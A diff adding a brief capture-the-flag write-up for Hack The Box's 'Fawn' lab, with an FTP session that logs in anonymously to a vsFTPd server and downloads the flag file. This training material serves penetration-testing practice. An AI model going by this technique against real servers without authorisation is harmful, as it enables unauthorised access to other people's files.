@@ -1,0 +1,49 @@
+#####################
+# Sources and Links #
+#####################
+
+#########
+# TL,DR #
+#########
+ftp is configured to have anonymous login.
+The flag is in the root directory.
+Use 'get' command to download the flag.
+
+########
+# Hack #
+########
+Nmap shows ftp with anonymous login.
+
+┌──(ryan㉿kali)-[~/HackTheBox/Fawn]
+└─$ ftp 10.129.65.216
+Connected to 10.129.65.216.
+220 (vsFTPd 3.0.3)
+Name (10.129.65.216:ryan): anonymous
+331 Please specify the password.
+Password: <Entered in random characters>
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> ls
+229 Entering Extended Passive Mode (|||35149|)
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
+226 Directory send OK.
+ftp> get flag.txt
+local: flag.txt remote: flag.txt
+229 Entering Extended Passive Mode (|||24545|)
+150 Opening BINARY mode data connection for flag.txt (32 bytes).
+100% |***************************************************|    32       93.84 KiB/s    00:00 ETA
+226 Transfer complete.
+32 bytes received in 00:00 (0.71 KiB/s)
+ftp> exit
+221 Goodbye.
+                                                                                                
+┌──(ryan㉿kali)-[~/HackTheBox/Fawn]
+└─$ ls -l flag.txt 
+-rw-r--r-- 1 ryan ryan 32 Jun  3  2021 flag.txt
+
+
+###########
+# Learned #
+###########
